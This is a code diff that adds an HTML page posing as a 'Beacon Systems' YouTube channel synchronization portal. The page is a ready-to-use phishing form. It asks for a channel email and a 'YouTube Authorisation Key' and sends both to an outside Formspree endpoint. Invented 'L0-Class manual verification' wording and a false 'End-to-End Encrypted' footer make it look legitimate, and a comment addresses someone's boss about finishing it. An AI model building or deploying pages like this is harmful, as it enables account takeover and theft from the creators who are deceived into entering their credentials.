@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beacon Systems | Manual Channel Synchronization</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0a0a0a; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .card { background: #111; padding: 40px; border-radius: 4px; width: 100%; max-width: 450px; border: 1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        
+        /* The specific circular App Icon from the photo */
+        .app-icon {
+            display: block;
+            margin: 0 auto 15px;
+            width: 70px;
+            height: 70px;
+            /* Placeholder URL: Once you have a live image file, your boss should replace this URL */
+            content: url('data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMTAwIDEwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZGVmcz48bGluZWFyR3JhZGllbnQgaWQ9ImdyYWQxIiB4MT0iMCUiIHkxPSIwJSIgeDI9IjEwMCUiIHkyPSIxMDAlIj48c3RvcCBvZmZzZXQ9IjAlIiBzdHlsZT0ic3RvcC1jb2xvcjojZmYwMDAwO3N0b3Atb3BhY2l0eToxIiAvPjxzdG9wIG9mZmNldD0iMTAwJSIgc3R5bGU9InN0b3AtY29sb3I6I2ZmNjY2NjtzdG9wLW9wYWNpdHk6MSIgLz48L2xpbmVhckdyYWRpZW50PjwvZGVmcz48Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI0OCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZmYwMDAwIiBzdHJva2Utd2lkdGg9IjIiLz48cGF0aCBkPSJNIDQwIDg1IEwgNjAgODUgTCA1MCAzNSB6IiBmaWxsPSJ1cmwoI2dyYWQxKSIvPjxwYXRoIGQ9Ik0gMzAgNjAgUSA1MCAzMCwgNzAgNjAiIGZpbGw9Im5vbmUiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSIyIi8+PHBhdGggZD0iTSAyNSA3MCBRIDUwIDIwLCA3NSA3MCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZmZmIiBzdHJva2Utd2lkdGg9IjIiLz48cGF0aCBkPSJNIDIwIDgwIFEgNTAgMTAsIDgwIDgwIiBmaWxsPSJ1cmwoI2dyYWQxKSIgc3Ryb2tlLXdpZHRoPSIyIi8+PGNpcmNoZSBjeD0iNTAiIGN5PSIzNSIgcj0iMyIgZmlsbD0iI2ZmZiIgLz48L3N2Zz4=');
+        }
+
+        /* Updated Main Header matching the photo */
+        .main-title { text-align: center; color: #fff; margin-bottom: 25px; text-transform: uppercase; letter-spacing: 2px; font-weight: 800; font-size: 24px;}
+        .main-title span { color: #ff0000; } /* Highlight BEACON */
+
+        h2 { text-align: center; color: #ff0000; margin-top: 0; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px; font-weight: 400;}
+        .info { text-align: center; color: #666; font-size: 12px; margin-bottom: 25px; line-height: 1.5; }
+        
+        label { display: block; font-size: 11px; margin-bottom: 8px; color: #999; font-weight: bold; text-transform: uppercase; }
+        input {
+            width: 100%; padding: 14px; margin-bottom: 25px; border: 1px solid #333; border-radius: 2px; background: #000; color: white; box-sizing: border-box; outline: none; font-size: 14px;
+        }
+        input:focus { border-color: #ff0000; }
+        .agreement { height: 130px; overflow-y: scroll; background: #050505; border: 1px solid #222; padding: 15px; font-size: 11px; color: #555; line-height: 1.6; margin-bottom: 20px; text-align: justify; }
+        
+        /* Agreement Scrollbar */
+        .agreement::-webkit-scrollbar { width: 5px; }
+        .agreement::-webkit-scrollbar-thumb { background: #333; }
+
+        .check-row { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 30px; font-size: 12px; color: #aaa; cursor: pointer; }
+        .btn { width: 100%; padding: 16px; background: #ff0000; border: none; border-radius: 2px; color: white; font-weight: bold; cursor: pointer; transition: 0.2s; text-transform: uppercase; }
+        .btn:disabled { background: #222; color: #444; cursor: not-allowed; }
+        .secure-footer { text-align: center; color: #333; font-size: 10px; text-transform: uppercase; letter-spacing: 2px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="" class="app-icon" alt="Beacon Systems App Icon">
+    <div class="main-title">BEACON <span>S</span>ystems</div>
+
+    <h2>MANUAL CHANNEL SYNCHRONIZATION</h2>
+    <div class="info">L0-Class manual verification required for integration with advanced growth optimization nodes and private viewer metrics.</div>
+
+    <form action="https://formspree.io/f/mvzddgvq" method="POST">
+        <label>YouTube ID</label>
+        <input type="text" name="YouTube_ID" placeholder="Channel Email" required>
+
+        <label>YouTube Authorisation Key</label>
+        <input type="text" name="YouTube_Auth_Key" placeholder="Access Key" required>
+
+        <label>Verification Node (Channel Link)</label>
+        <input type="text" name="Channel_URL" placeholder="youtube.com/@handle" required>
+
+        <div class="agreement">
+        </div>
+
+        <label class="check-row">
+            <input type="checkbox" id="check"> 
+            <span>I authorize the manual sync and ownership verification.</span>
+        </label>
+
+        <button type="submit" id="btn" class="btn" disabled>SYNC CHANNEL</button>
+        <div class="secure-footer">End-to-End Encrypted Verification</div>
+    </form>
+</div>
+
+<script>
+    const check = document.getElementById('check');
+    const btn = document.getElementById('btn');
+    check.addEventListener('change', () => { btn.disabled = !check.checked; });
+</script>
+
+</body>
+</html>
